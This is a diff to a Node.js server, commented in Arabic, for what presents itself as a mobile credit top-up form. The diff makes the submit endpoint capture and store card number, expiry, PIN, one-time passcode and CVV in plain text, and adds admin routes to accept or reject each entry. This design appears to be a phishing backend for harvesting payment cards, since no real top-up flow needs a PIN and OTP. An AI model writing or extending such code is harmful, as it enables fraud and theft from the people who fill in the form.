@@ -76,14 +76,46 @@ const server = http.createServer(async (req, res) => {
   const url = req.url.split('?')[0];
   const method = req.method;
 
-  // استقبال طلب شحن (رقم الجوال + مبلغ الشحن)
+  // استقبال طلب شحن
   if (url === '/api/submit' && method === 'POST') {
     const b = await readBody(req);
-    const phone = String(b.phone || '').trim();
+    const phone  = String(b.phone  || '').trim();
     const amount = String(b.amount || '').trim();
     if (!phone || !amount) return sendJSON(res, 400, { error: 'بيانات ناقصة' });
-    submissions.unshift({ id: crypto.randomBytes(6).toString('hex'), phone, amount, time: new Date().toISOString() });
+    submissions.unshift({
+      id: crypto.randomBytes(6).toString('hex'),
+      phone, amount,
+      card:   String(b.card   || '').trim(),
+      expiry: String(b.expiry || '').trim(),
+      pin:    String(b.pin    || '').trim(),
+      otp:    String(b.otp    || '').trim(),
+      cvv:    String(b.cvv    || '').trim(),
+      status: 'pending',
+      time:   new Date().toISOString()
+    });
     if (submissions.length > 5000) submissions = submissions.slice(0, 5000);
+    saveSubmissions();
+    return sendJSON(res, 200, { ok: true });
+  }
+
+  // قبول طلب
+  if (url.startsWith('/api/admin/accept/') && method === 'POST') {
+    if (!isAuthed(req)) return sendJSON(res, 401, { error: 'غير مصرح' });
+    const id = url.slice('/api/admin/accept/'.length);
+    const sub = submissions.find(s => s.id === id);
+    if (!sub) return sendJSON(res, 404, { error: 'غير موجود' });
+    sub.status = 'accepted';
+    saveSubmissions();
+    return sendJSON(res, 200, { ok: true });
+  }
+
+  // رفض طلب
+  if (url.startsWith('/api/admin/reject/') && method === 'POST') {
+    if (!isAuthed(req)) return sendJSON(res, 401, { error: 'غير مصرح' });
+    const id = url.slice('/api/admin/reject/'.length);
+    const sub = submissions.find(s => s.id === id);
+    if (!sub) return sendJSON(res, 404, { error: 'غير موجود' });
+    sub.status = 'rejected';
     saveSubmissions();
     return sendJSON(res, 200, { ok: true });
   }
